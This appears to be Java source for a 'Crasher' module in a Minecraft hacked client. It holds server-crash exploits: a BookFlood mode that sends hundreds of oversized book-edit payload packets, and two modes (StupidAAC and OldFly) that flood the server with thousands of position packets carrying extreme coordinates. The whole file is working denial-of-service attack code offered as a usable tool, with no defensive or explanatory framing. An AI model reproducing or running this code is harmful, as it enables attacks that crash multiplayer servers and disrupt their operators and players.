package complex.module.impl.exploit;

import complex.Complex;
import complex.event.EventTarget;
import complex.event.impl.EventPacket;
import complex.event.impl.EventTick;
import complex.event.impl.EventUpdate;
import complex.module.Category;
import complex.module.Module;
import complex.module.data.Setting;
import complex.utils.RandomUtils;
import io.netty.buffer.Unpooled;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.network.play.server.SPacketCustomPayload;
import net.minecraft.network.play.server.SPacketServerDifficulty;

import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Random;

public class Crasher extends Module {
    private String mode;

    public Crasher() {
        super("Crasher", null, 0, 0, Category.Exploit);
    }

    @Override
    public void setup() {
        ArrayList<String> options = new ArrayList<>();
        options.add("BookFlood");
        options.add("OldFly");
        options.add("StupidAAC");
        options.add("PayloadTest");
        Complex.getSettingsManager().rSetting(new Setting("Crash Mode", this, "BookFlood", options));
    }

    @EventTarget
    public void onUpdate(EventUpdate update) {
        mode = Complex.getSettingsManager().getSettingByName("Crash Mode").getValString();
        if (mode.equalsIgnoreCase("BookFlood")) {
            this.setDisplayName("Crasher ยง7BookFlood");
            final ItemStack bookStack = new ItemStack(Items.WRITABLE_BOOK);
            final NBTTagCompound bookCompound = new NBTTagCompound();

            bookCompound.setString("author", RandomUtils.randomNumber(20));
            bookCompound.setString("title", RandomUtils.randomNumber(20));

            final NBTTagList pageList = new NBTTagList();
            final String pageText = RandomUtils.randomNumber(600);

            for (int page = 0; page < 50; page++) {
                pageList.appendTag(new NBTTagString(pageText));
            }

            bookCompound.setTag("pages", pageList);
            bookStack.setTagCompound(bookCompound);

            for (int packets = 0; packets < 100; packets++) {
                final PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
                packetBuffer.writeItemStackToBuffer(bookStack);
                mc.getConnection().sendPacket(new CPacketCustomPayload(new Random().nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
            }
        } else if (mode.equalsIgnoreCase("StupidAAC")) {
            this.setDisplayName("Crasher ยง7StupidAAC");
            for(int index = 0; index < 9999; ++index)
                mc.getConnection().sendPacket(new CPacketPlayer.Position(mc.thePlayer.posX + 9412 * index, mc.thePlayer.getEntityBoundingBox().minY + 9412 * index, mc.thePlayer.posZ + 9412 * index, true));
        } else if (mode.equalsIgnoreCase("OldFly")) {
            this.setDisplayName("Crasher ยง7OldFly");
            this.Test();
            if (Complex.getModuleManager().isEnabled("Crasher")) {
                toggle();
            }
        } else if (mode.equalsIgnoreCase("PayloadTest")) {
            this.setDisplayName("Crasher ยง7PayloadTest");

        }
    }

    @EventTarget
    public void onTick(EventTick tick) {
        if(mc.thePlayer == null || mc.theWorld == null && Complex.getModuleManager().isEnabled("Crasher"))
            toggle();
    }
    @EventTarget
    public void onPacket(EventPacket e) {
        if (mode.equalsIgnoreCase("PayloadTest")) {
            if (mc.theWorld != null && e.getPacket() instanceof SPacketCustomPayload) {
                SPacketCustomPayload SCP = (SPacketCustomPayload) e.getPacket();
            }
        }
    }

    public void Test() {
        double playerX = this.mc.thePlayer.posX;
        double playerY = this.mc.thePlayer.posY;
        double playerZ = this.mc.thePlayer.posZ;
        double y = 0.0D;
        double x = 0.0D;
        double z = 0.0D;
        int i = 0;
        while (i < 200) {
            y = (i * 9);
            this.mc.thePlayer.connection.sendPacketNoEvent(new CPacketPlayer.Position(playerX, playerY + y, playerZ, false));
            i++;
        }
        i = 0;
        while (i < 10000) {
            z = (i * 9);
            this.mc.thePlayer.connection.sendPacketNoEvent(new CPacketPlayer.Position(playerX, playerY + y, playerZ + z, false));
            i++;
        }
    }
}
